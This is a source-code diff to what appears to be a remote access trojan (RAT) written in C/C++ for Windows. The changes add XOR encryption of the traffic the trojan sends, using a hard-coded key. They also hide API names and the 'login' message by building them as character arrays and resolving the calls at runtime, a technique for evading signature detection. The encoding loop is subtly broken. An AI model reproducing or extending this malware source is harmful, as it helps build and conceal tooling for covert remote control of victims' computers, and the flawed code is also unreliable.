@@ -9,6 +9,7 @@
 #include "tools.cpp"
 
 #define global static
+#define CRYPT_KEY 33
 
 global HMODULE gLibraryKernel32;
 global _recv* gf_recv;
@@ -23,11 +24,35 @@ struct RATSocket
 };
 
 int
+EncryptDecryptString(char* str)
+{
+	int i = 0;
+	while(*str != NULL )
+	{
+		if ( *str != 0 )
+		{
+			*str++ = *str ^ (char)(CRYPT_KEY);
+		}
+		i++;
+	}
+	return 0;
+}
+
+int
 SocketSend(RATSocket* ratSocket, char*
 		   messageBuffer, unsigned int bufferSize)
 {
 	char ca_send[] = { 's','e','n','d', 0};
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
+
+	OutputDebugString(messageBuffer);
+	OutputDebugString(" << Before\n");
+
+	EncryptDecryptString(messageBuffer);
+
+	OutputDebugString(messageBuffer);
+	OutputDebugString(" << After\n");
+	
 	if ( f_send(ratSocket->socketConnection, messageBuffer, bufferSize, 0) == SOCKET_ERROR )
 	{
 #if DEBUG		
@@ -550,7 +575,8 @@ WinMain(HINSTANCE hInstance,
 		}
 	}
 
-	SocketSend(&ratSocket, "login", 5);
+	char ca_login[] = { 'l','o','g','i','n',0 };
+	SocketSend(&ratSocket, ca_login, 5);
 
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	gf_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
